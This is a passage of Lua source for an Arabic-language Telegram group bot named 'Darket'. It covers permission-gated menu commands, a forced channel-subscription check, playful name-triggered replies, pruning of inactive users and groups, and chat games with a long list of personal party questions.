{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
return send(msg_chat_id,msg_id, [[*
٠ توجد ٠ 6 اوامر في البوت
– – – – – – – –
٠ 1 ٠ اوامر الحمايه
٠ 2 ٠ اوامر الادمنيه
٠ 3 ٠ اوامر المدراء
٠ 4 ٠ اوامر المنشئين
٠ 5 ٠ اوامر مطورين البوت
٠ 6 ٠ اوامر التسلية البوت
*]],"md",false, false, false, false, reply_markup)
elseif text == 'م1' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ' قائمه الاوامر ', data = msg.sender.user_id..'/helpall'},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
return send(msg_chat_id,msg_id,'٠ عليك استخدام اوامر التحكم بالقوائم',"md",false, false, false, false, reply_markup)
elseif text == 'م2' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ' قائمه الاوامر ', data = msg.sender.user_id..'/helpall'},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
return send(msg_chat_id,msg_id,'٠ عليك استخدام اوامر التحكم بالقوائم',"md",false, false, false, false, reply_markup)
elseif text == 'م3' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ' قائمه الاوامر ', data = msg.sender.user_id..'/helpall'},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
return send(msg_chat_id,msg_id,'٠ عليك استخدام اوامر التحكم بالقوائم',"md",false, false, false, false, reply_markup)
elseif text == 'م4' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ' قائمه الاوامر ', data = msg.sender.user_id..'/helpall'},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
return send(msg_chat_id,msg_id,'٠ عليك استخدام اوامر التحكم بالقوائم',"md",false, false, false, false, reply_markup)
elseif text == 'م5' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ' قائمه الاوامر ', data = msg.sender.user_id..'/helpall'},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
return send(msg_chat_id,msg_id,'٠ عليك استخدام اوامر التحكم بالقوائم',"md",false, false, false, false, reply_markup)
elseif text == 'م6' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ' قائمه الاوامر ', data = msg.sender.user_id..'/helpall'},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
return send(msg_chat_id,msg_id,'٠ عليك استخدام اوامر التحكم بالقوائم',"md",false, false, false, false, reply_markup)
elseif text == 'الالعاب' then
if not msg.Admin then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(7)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = ' قائمه الاوامر ', data = msg.sender.user_id..'/helpall'},
},
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
return send(msg_chat_id,msg_id,'٠ عليك استخدام اوامر التحكم بالقوائم',"md",false, false, false, false, reply_markup)
end

if text == 'تحديث' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end

if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
print('Chat Id : '..msg_chat_id)
print('User Id : '..msg_user_send_id)
send(msg_chat_id,msg_id, "٠ تم تحديث الملفات ","md",true)
dofile('darket.lua')  
end
if text == "تغيير اسم البوت" then 
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(darket.."Change:Name:Bot"..msg.sender.user_id,300,true) 
return send(msg_chat_id,msg_id,"٠ ارسل لي الاسم الان ","md",true)  
end
if text == "حذف اسم البوت" then 
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(darket.."Name:Bot") 
return send(msg_chat_id,msg_id,"٠ تم حذف اسم البوت ","md",true)   
end
if text == (Redis:get(darket.."Name:Bot") or "داركت") then
if Redis:get(darket.."name bot type : ") == "photo" then
  local photo = LuaTele.getUserProfilePhotos(darket)
  local UserInfo = LuaTele.getUser(darket)
  local Name_User = UserInfo.first_name
  local Name_dev = LuaTele.getUser(Sudo_Id).first_name
  local UName_dev = LuaTele.getUser(Sudo_Id).username
  local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
    {
      {text = Name_User, url = "t.me/"..UserInfo.username}
    },
    {
      {text = Name_dev, url = "t.me/"..UName_dev }
    }
  }
  }
  
  if photo.total_count > 0 then
    local NamesBot = (Redis:get(darket.."Name:Bot") or "داركت")
    local NameBots = {
"قلب "..NamesBot ,
"مين مزعلك بس يعيوني",
"ثانيه واحده بسلك رقم واحده",
"انا مش فاضي داركت مكاني اهو",
"قلبه ودقاته وكل حياته"
}
  return LuaTele.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,NameBots[math.random(#NameBots)], "md", true, nil, nil, nil, nil, nil, nil, nil, nil, reply_markup )
  else
    local NamesBot = (Redis:get(darket.."Name:Bot") or "داركت")
    local NameBots = {
"قلب "..NamesBot ,
"مين مزعلك بس يعيوني",
"ثانيه واحده بسلك رقم واحده",
"انا مش فاضي داركت مكاني اهو",
"قلبه ودقاته وكل حياته"
}
  return send(msg_chat_id,msg_id,NameBots[math.random(#NameBots)],"md") 
  end 
  end
      local NamesBot = (Redis:get(darket.."Name:Bot") or "داركت")
    local NameBots = {
"قلب "..NamesBot ,
"مين مزعلك بس يعيوني",
"ثانيه واحده بسلك رقم واحده",
"انا مش فاضي داركت مكاني اهو",
"قلبه ودقاته وكل حياته"
}
  return send(msg_chat_id,msg_id,NameBots[math.random(#NameBots)],"md") 
 
end
----
----
if text == "بوت" then
if Redis:get(darket.."name bot type : ") == "photo" then
  
    local photo = LuaTele.getUserProfilePhotos(darket)
    local UserInfo = LuaTele.getUser(darket)
    local Name_User = UserInfo.first_name
    local Name_dev = LuaTele.getUser(Sudo_Id).first_name
    local UName_dev = LuaTele.getUser(Sudo_Id).username
    local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {
      {
        {text = Name_User, url = "t.me/"..UserInfo.username}
      },
      {
        {text = Name_dev, url = "t.me/"..UName_dev }
      }
    }
    }
    
    if photo.total_count > 0 then
      local NamesBot = (Redis:get(darket.."Name:Bot") or "داركت")
      local BotName = {
      "اسمي "..NamesBot.." يبن العاميه",
      "يارب يكون موضوع مهم بس",
      "هو يوم مهبب انا عارف..عاوز اي ؟",
      "اسمي "..NamesBot.." يا كفيف",
      "مش شايف اسمي ولا اي ؟"
      }
    return LuaTele.sendPhoto(msg.chat_id, msg.id, photo.photos[1].sizes[#photo.photos[1].sizes].photo.remote.id,BotName[math.random(#BotName)], "md", true, nil, nil, nil, nil, nil, nil, nil, nil, reply_markup )
    else
      local NamesBot = (Redis:get(darket.."Name:Bot") or "داركت")
      local BotName = {
      "اسمي "..NamesBot.." يبن العاميه",
      "يارب يكون موضوع مهم بس",
      "هو يوم مهبب انا عارف..عاوز اي ؟",
      "اسمي "..NamesBot.." يا كفيف",
      "مش شايف اسمي ولا اي ؟"
      }
    return send(msg_chat_id,msg_id,BotName[math.random(#BotName)],"md") 
    end 
    end
          local NamesBot = (Redis:get(darket.."Name:Bot") or "داركت")
      local BotName = {
      "اسمي "..NamesBot.." يبن العاميه",
      "يارب يكون موضوع مهم بس",
      "هو يوم مهبب انا عارف..عاوز اي ؟",
      "اسمي "..NamesBot.." يا كفيف",
      "مش شايف اسمي ولا اي ؟"
      }
    return send(msg_chat_id,msg_id,BotName[math.random(#BotName)],"md") 

  end
  ----
if text == 'تنظيف المشتركين' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."Num:User:Pv")   
local x = 0
for k,v in pairs(list) do  
local Get_Chat = LuaTele.getChat(v)
local ChatAction = LuaTele.sendChatAction(v,'Typing')
if ChatAction.luatele ~= "ok" then
x = x + 1
Redis:srem(darket..'Num:User:Pv',v)
end
end
if x ~= 0 then
return send(msg_chat_id,msg_id,'*٠ العدد الكلي { '..#list..' }\n٠ تم العثور على { '..x..' } من المشتركين حاظرين البوت*',"md")
else
return send(msg_chat_id,msg_id,'*٠ العدد الكلي { '..#list..' }\n٠ لم يتم العثور على وهميين*',"md")
end
end
if text == 'تنظيف المجموعات' then
if not msg.ControllerBot then 
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(1)..' * ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(darket.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return send(msg.chat_id,msg.id,'*\n٠ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
local list = Redis:smembers(darket.."ChekBotAdd")   
local x = 0
for k,v in pairs(list) do  
local Get_Chat = LuaTele.getChat(v)
if Get_Chat.id then
local statusMem = LuaTele.getChatMember(Get_Chat.id,darket)
if statusMem.status.luatele == "chatMemberStatusMember" then
x = x + 1
send(Get_Chat.id,0,'*٠ البوت عضو في الكروب سوف اغادر ويمكنك تفعيلي مره اخره *',"md")
Redis:srem(darket..'ChekBotAdd',Get_Chat.id)
local keys = Redis:keys(darket..'*'..Get_Chat.id)
for i = 1, #keys do
Redis:del(keys[i])
end
LuaTele.leaveChat(Get_Chat.id)
end
else
x = x + 1
local keys = Redis:keys(darket..'*'..v)
for i = 1, #keys do
Redis:del(keys[i])
end
Redis:srem(darket..'ChekBotAdd',v)
LuaTele.leaveChat(v)
end
end
if x ~= 0 then
return send(msg_chat_id,msg_id,'*٠ العدد الكلي { '..#list..' } للمجموعات \n٠ تم العثور على { '..x..' } مجموعات البوت ليس ادمن \n٠ تم تعطيل الكروب ومغادره البوت من الوهمي *',"md")
else
return send(msg_chat_id,msg_id,'*٠ العدد الكلي { '..#list..' } للمجموعات \n٠ لا توجد مجموعات وهميه*',"md")
end
end
if text == "سمايلات" or text == "سمايل" then
if Redis:get(darket.."Status:Games"..msg.chat_id) then
Random = {"🍏","🍎","🍐","🍊","🍋","🍉","🍇","🍓","🍈","🍒","🍑","🍍","🥥","🥝","🍅","🍆","🥑","🥦","🥒","🌶","🌽","🥕","🥔","🥖","🥐","🍞","🥨","🍟","🧀","🥚","🍳","🥓","🥩","🍗","🍖","🌭","🍔","🍠","🍕","🥪","🥙","☕️","🥤","🍶","🍺","🍻","🏀","⚽️","🏈","⚾️","🎾","🏐","🏉","🎱","🏓","🏸","🥅","🎰","🎮","🎳","🎯","🎲","🎻","🎸","🎺","🥁","🎹","🎼","🎧","🎤","🎬","🎨","🎭","🎪","🎟","🎫","🎗","🏵","🎖","🏆","🥌","🛷","🚗","🚌","🏎","🚓","🚑","🚚","🚛","🚜","⚔","🛡","🔮","🌡","💣","٠","📍","📓","📗","📂","📅","📪","📫","٠","📭","⏰","📺","🎚","☎️","📡"}
SM = Random[math.random(#Random)]
Redis:set(darket.."Game:Smile"..msg.chat_id,SM)
return send(msg_chat_id,msg_id,"٠اسرع واحد يدز هاذا السمايل ? ~ {`"..SM.."`}","md",true)  
end
end
if text == "تويت" or text == "كت تويت" then
if Redis:get(darket.."Status:Games"..msg.chat_id) then
local texting = {"اخر افلام شاهدتها", 
"اخر افلام شاهدتها", 
"ما هي وظفتك الحياه", 
"اعز اصدقائك ?", 
"اخر اغنية سمعتها ?", 
"تكلم عن نفسك", 
"ليه انت مش سالك", 
"ما هيا عيوب سورس داركت؟ ", 
"اخر كتاب قرآته", 
"روايتك المفضله ?", 
"اخر اكله اكلتها", 
"اخر كتاب قرآته", 
"ليش حسين ذكي؟ ", 
"افضل يوم ف حياتك", 
"ليه مضيفتش كل جهاتك", 
"حكمتك ف الحياه", 
"لون عيونك", 
"كتابك المفضل", 
"هوايتك المفضله", 
"علاقتك مع اهلك", 
" ما السيء في هذه الحياة ؟ ", 
"أجمل شيء حصل معك خلال هذا الاسبوع ؟ ", 
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورس داركت؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورس داركت؟ ", 
"كم مره حبيت؟ ", 
" اكثر المتابعين عندك باي برنامج؟", 
" نسبه الندم عندك للي وثقت فيهم ؟", 
"تحب ترتبط بكيرفي ولا فلات؟", 
" جربت شعور احد يحبك بس انت مو قادر تحبه؟", 
" تجامل الناس ولا اللي بقلبك على لسانك؟", 
" عمرك ضحيت باشياء لاجل شخص م يسوى ؟", 
"مغني تلاحظ أن صوته يعجب الجميع إلا أنت؟ ", 
" آخر غلطات عمرك؟ ", 
" مسلسل كرتوني له ذكريات جميلة عندك؟ ", 
" ما أكثر تطبيق تقضي وقتك عليه؟ ", 
" أول شيء يخطر في بالك إذا سمعت كلمة نجوم ؟ ", 
" قدوتك من الأجيال السابقة؟ ", 
" أكثر طبع تهتم بأن يتواجد في شريك/ة حياتك؟ ", 
"أكثر حيوان تخاف منه؟ ", 
" ما هي طريقتك في الحصول على الراحة النفسية؟ ", 
" إيموجي يعبّر عن مزاجك الحالي؟ ", 
" أكثر تغيير ترغب أن تغيّره في نفسك؟ ", 
"أكثر شيء أسعدك اليوم؟ ", 
"اي رايك في الدنيا دي ؟ ", 
"ما هو أفضل حافز للشخص؟ ", 
"ما الذي يشغل بالك في الفترة الحالية؟", 
"آخر شيء ندمت عليه؟ ", 
"شاركنا صورة احترافية من تصويرك؟ ", 
"تتابع انمي؟ إذا نعم ما أفضل انمي شاهدته ", 
"يرد عليك متأخر على رسالة مهمة وبكل برود، موقفك؟ ", 
"نصيحه تبدا ب -لا- ؟ ", 
"كتاب أو رواية تقرأها هذه الأيام؟ ", 
"فيلم عالق في ذهنك لا تنساه مِن روعته؟ ", 
"يوم لا يمكنك نسيانه؟ ", 
"شعورك الحالي في جملة؟ ", 
"كلمة لشخص بعيد؟ ", 
"صفة يطلقها عليك الشخص المفضّل؟ ", 
"أغنية عالقة في ذهنك هاليومين؟ ", 
"أكلة مستحيل أن تأكلها؟ ", 
"كيف قضيت نهارك؟ ", 
"تصرُّف ماتتحمله؟ ", 
"موقف غير حياتك؟ ", 
"اكثر مشروب تحبه؟ ", 
"القصيدة اللي تأثر فيك؟ ", 
"متى يصبح الصديق غريب ", 
"وين نلقى السعاده برايك؟ ", 
"تاريخ ميلادك؟ ", 
"قهوه و لا شاي؟ ", 
"من محبّين الليل أو الصبح؟ ", 
"حيوانك المفضل؟ ", 
"كلمة غريبة ومعناها؟ ", 
"كم تحتاج من وقت لتثق بشخص؟ ", 
"اشياء نفسك تجربها؟ ", 
"يومك ضاع على؟ ", 
"كل شيء يهون الا ؟ ", 
"اسم ماتحبه ؟ ", 
"وقفة إحترام للي إخترع ؟ ", 
"أقدم شيء محتفظ فيه من صغرك؟ ", 
"كلمات ماتستغني عنها بسوالفك؟ ", 
"وش الحب بنظرك؟ ", 
"حب التملك في شخصِيـتك ولا ؟ ", 
"تخطط للمستقبل ولا ؟ ", 
"موقف محرج ماتنساه ؟ ", 
"من طلاسم لهجتكم ؟ ", 
"اعترف باي حاجه ؟ ", 
"عبّر عن مودك بصوره ؟ ",
"اسم دايم ع بالك ؟ ", 
"اشياء تفتخر انك م سويتها ؟ ", 
" لو بكيفي كان ؟ ", 
  "أكثر جملة أثرت بك في حياتك؟ ",
  "إيموجي يوصف مزاجك حاليًا؟ ",
  "أجمل اسم بنت بحرف الباء؟ ",
  "كيف هي أحوال قلبك؟ ",
  "أجمل مدينة؟ ",
  "كيف كان أسبوعك؟ ",
  "شيء تشوفه اكثر من اهلك ؟ ",
  "اخر مره فضفضت؟ ",
  "قد كرهت احد بسبب اسلوبه؟ ",
  "قد حبيت شخص وخذلك؟ ",
  "كم مره حبيت؟ ",
  "اكبر غلطة بعمرك؟ ",
  "نسبة النعاس عندك حاليًا؟ ",
  "شرايكم بمشاهير التيك توك؟ ",
  "ما الحاسة التي تريد إضافتها للحواس الخمسة؟ ",
  "اسم قريب لقلبك؟ ",
  "مشتاق لمطعم كنت تزوره قبل الحظر؟ ",
  "أول شيء يخطر في بالك إذا سمعت كلمة (ابوي يبيك)؟ ",
  "ما أول مشروع تتوقع أن تقوم بإنشائه إذا أصبحت مليونير؟ ",
  "أغنية عالقة في ذهنك هاليومين؟ ",
  "متى اخر مره قريت قرآن؟ ",
  "كم صلاة فاتتك اليوم؟ ",
  "تفضل التيكن او السنقل؟ ",
  "وش أفضل بوت برأيك؟ ",
"كم لك بالتلي؟ ",
"وش الي تفكر فيه الحين؟ ",
"كيف تشوف الجيل ذا؟ ",
"منشن شخص وقوله، تحبني؟ ",
"لو جاء شخص وعترف لك كيف ترده؟ ",
"مر عليك موقف محرج؟ ",
"وين تشوف نفسك بعد سنتين؟ ",
"لو فزعت/ي لصديق/ه وقالك مالك دخل وش بتسوي/ين؟ ",
"وش اجمل لهجة تشوفها؟ ",
"قد سافرت؟ ",
"افضل مسلسل عندك؟ ",
"افضل فلم عندك؟ ",
"مين اكثر يخون البنات/العيال؟ ",
"متى حبيت؟ ",
  "بالعادة متى تنام؟ ",
  "شيء من صغرك ماتغيير فيك؟ ",
  "شيء بسيط قادر يعدل مزاجك بشكل سريع؟ ",
  "تشوف الغيره انانيه او حب؟ ",
"حاجة تشوف نفسك مبدع فيها؟ ",
  "مع او ضد : يسقط جمال المراة بسبب قبح لسانها؟ ",
  "عمرك بكيت على شخص مات في مسلسل ؟ ",
  "‏- هل تعتقد أن هنالك من يراقبك بشغف؟ ",
  "تدوس على قلبك او كرامتك؟ ",
  "اكثر لونين تحبهم مع بعض؟ ",
  "مع او ضد : النوم افضل حل لـ مشاكل الحياة؟ ",
  "سؤال دايم تتهرب من الاجابة عليه؟ ",
  "تحبني ولاتحب الفلوس؟ ",
  "العلاقه السريه دايماً تكون حلوه؟ ",
  "لو أغمضت عينيك الآن فما هو أول شيء ستفكر به؟ ",
"كيف ينطق الطفل اسمك؟ ",
  "ما هي نقاط الضعف في شخصيتك؟ ",
  "اكثر كذبة تقولها؟ ",
  "تيكن ولا اضبطك؟ ",
  "اطول علاقة كنت فيها مع شخص؟ ",
  "قد ندمت على شخص؟ ",
  "وقت فراغك وش تسوي؟ ",
  "عندك أصحاب كثير؟ ولا ينعد بالأصابع؟ ",
  "حاط نغمة خاصة لأي شخص؟ ",
  "وش اسم شهرتك؟ ",
  "أفضل أكلة تحبه لك؟ ",
"عندك شخص تسميه ثالث والدينك؟ ",
  "عندك شخص تسميه ثالث والدينك؟ ",
  "اذا قالو لك تسافر أي مكان تبيه وتاخذ معك شخص واحد وين بتروح ومين تختار؟ ",
  "أطول مكالمة كم ساعة؟ ",
  "تحب الحياة الإلكترونية ولا الواقعية؟ ",
  "كيف حال قلبك ؟ بخير ولا مكسور؟ ",
  "أطول مدة نمت فيها كم ساعة؟ ",
  "تقدر تسيطر على ضحكتك؟ ",
  "أول حرف من اسم الحب؟ ",
  "تحب تحافظ على الذكريات ولا تمسحه؟ ",
  "اسم اخر شخص زعلك؟ ",
"وش نوع الأفلام اللي تحب تتابعه؟ ",
  "أنت انسان غامض ولا الكل يعرف عنك؟ ",
  "لو الجنسية حسب ملامحك وش بتكون جنسيتك؟ ",
  "عندك أخوان او خوات من الرضاعة؟ ",
  "إختصار تحبه؟ ",
  "إسم شخص وتحس أنه كيف؟ ",
  "وش الإسم اللي دايم تحطه بالبرامج؟ ",
  "وش برجك؟ ",
  "لو يجي عيد ميلادك تتوقع يجيك هدية؟ ",
  "اجمل هدية جاتك وش هو؟ ",
  "الصداقة ولا الحب؟ ",
"الصداقة ولا الحب؟ ",
  "الغيرة الزائدة شك؟ ولا فرط الحب؟ ",
  "قد حبيت شخصين مع بعض؟ وانقفطت؟ ",
  "وش أخر شي ضيعته؟ ",
  "قد ضيعت شي ودورته ولقيته بيدك؟ ",
  "تؤمن بمقولة اللي يبيك مايحتار فيك؟ ",
  "سبب وجوك بالتليجرام؟ ",
  "تراقب شخص حاليا؟ ",
  "عندك معجبين ولا محد درا عنك؟ ",
  "لو نسبة جمالك بتكون بعدد شحن جوالك كم بتكون؟ ",
  "أنت محبوب بين الناس؟ ولاكريه؟ ",
"كم عمرك؟ ",
  "لو يسألونك وش اسم امك تجاوبهم ولا تسفل فيهم؟ ",
  "تؤمن بمقولة الصحبة تغنيك الحب؟ ",
  "وش مشروبك المفضل؟ ",
  "قد جربت الدخان بحياتك؟ وانقفطت ولا؟ ",
  "أفضل وقت للسفر؟ الليل ولا النهار؟ ",
  "انت من النوع اللي تنام بخط السفر؟ ",
  "عندك حس فكاهي ولا نفسية؟ ",
  "تبادل الكراهية بالكراهية؟ ولا تحرجه بالطيب؟ ",
  "أفضل ممارسة بالنسبة لك؟ ",
  "لو قالو لك تتخلى عن شي واحد تحبه بحياتك وش يكون؟ ",
"لو احد تركك وبعد فتره يحاول يرجعك بترجع له ولا خلاص؟ ",
  "برأيك كم العمر المناسب للزواج؟ ",
  "اذا تزوجت بعد كم بتخلف عيال؟ ",
  "فكرت وش تسمي أول اطفالك؟ ",
  "من الناس اللي تحب الهدوء ولا الإزعاج؟ ",
  "الشيلات ولا الأغاني؟ ",
  "عندكم شخص مطوع بالعايلة؟ ",
  "تتقبل النصيحة من اي شخص؟ ",
  "اذا غلطت وعرفت انك غلطان تحب تعترف ولا تجحد؟ ",
  "جربت شعور احد يحبك بس انت مو قادر تحبه؟ ",
  "دايم قوة الصداقة تكون بإيش؟ ",
"أفضل البدايات بالعلاقة بـ وش؟ ",
  "وش مشروبك المفضل؟ او قهوتك المفضلة؟ ",
  "تحب تتسوق عبر الانترنت ولا الواقع؟ ",
  "انت من الناس اللي بعد ماتشتري شي وتروح ترجعه؟ ",
  "أخر مرة بكيت متى؟ وليش؟ ",
  "عندك الشخص اللي يقلب الدنيا عشان زعلك؟ ",
  "أفضل صفة تحبه بنفسك؟ ",
  "كلمة تقولها للوالدين؟ ",
  "أنت من الناس اللي تنتقم وترد الاذى ولا تحتسب الأجر وتسامح؟ ",
  "كم عدد سنينك بالتليجرام؟ ",
  "تحب تعترف ولا تخبي؟ ",
"انت من الناس الكتومة ولا تفضفض؟ ",
  "أنت بعلاقة حب الحين؟ ",
  "عندك اصدقاء غير جنسك؟ ",
  "أغلب وقتك تكون وين؟ ",
  "لو المقصود يقرأ وش بتكتب له؟ ",
  "تحب تعبر بالكتابة ولا بالصوت؟ ",
  "عمرك كلمت فويس احد غير جنسك؟ ",
  "لو خيروك تصير مليونير ولا تتزوج الشخص اللي تحبه؟ ",
  "لو عندك فلوس وش السيارة اللي بتشتريها؟ ",
  "كم أعلى مبلغ جمعته؟ ",
  "اذا شفت احد على غلط تعلمه الصح ولا تخليه بكيفه؟ ",
"قد جربت تبكي فرح؟ وليش؟ ",
"تتوقع إنك بتتزوج اللي تحبه؟ ",
  "ما هو أمنيتك؟ ",
  "وين تشوف نفسك بعد خمس سنوات؟ ",
  "لو خيروك تقدم الزمن ولا ترجعه ورا؟ ",
  "لعبة قضيت وقتك فيه بالحجر المنزلي؟ ",
  "تحب تطق الميانة ولا ثقيل؟ ",
  "باقي معاك للي وعدك ما بيتركك؟ ",
  "اول ماتصحى من النوم مين تكلمه؟ ",
  "عندك الشخص اللي يكتب لك كلام كثير وانت نايم؟ ",
  "قد قابلت شخص تحبه؟ وولد ولا بنت؟ ",
"اذا قفطت احد تحب تفضحه ولا تستره؟ ",
  "كلمة للشخص اللي يسب ويسطر؟ ",
  "آية من القران تؤمن فيه؟ ",
  "تحب تعامل الناس بنفس المعاملة؟ ولا تكون أطيب منهم؟ ",
"حاجة ودك تغييرها هالفترة؟ ",
  "كم فلوسك حاليا وهل يكفيك ام لا؟ ",
  "وش لون عيونك الجميلة؟ ",
  "من الناس اللي تتغزل بالكل ولا بالشخص اللي تحبه بس؟ ",
  "اذكر موقف ماتنساه بعمرك؟ ",
  "وش حاب تقول للاشخاص اللي بيدخل حياتك؟ ",
  "ألطف شخص مر عليك بحياتك؟ ",
"انت من الناس المؤدبة ولا نص نص؟ ",
  "كيف الصيد معاك هالأيام ؟ وسنارة ولاشبك؟ ",
  "لو الشخص اللي تحبه قال بدخل حساباتك بتعطيه ولا تكرشه؟ ",
  "أكثر شي تخاف منه بالحياه وش؟ ",
  "اكثر المتابعين عندك باي برنامج؟ ",
  "متى يوم ميلادك؟ ووش الهدية اللي نفسك فيه؟ ",
  "قد تمنيت شي وتحقق؟ ",
  "قلبي على قلبك مهما صار لمين تقولها؟ ",
  "وش نوع جوالك؟ واذا بتغييره وش بتأخذ؟ ",
  "كم حساب عندك بالتليجرام؟ ",
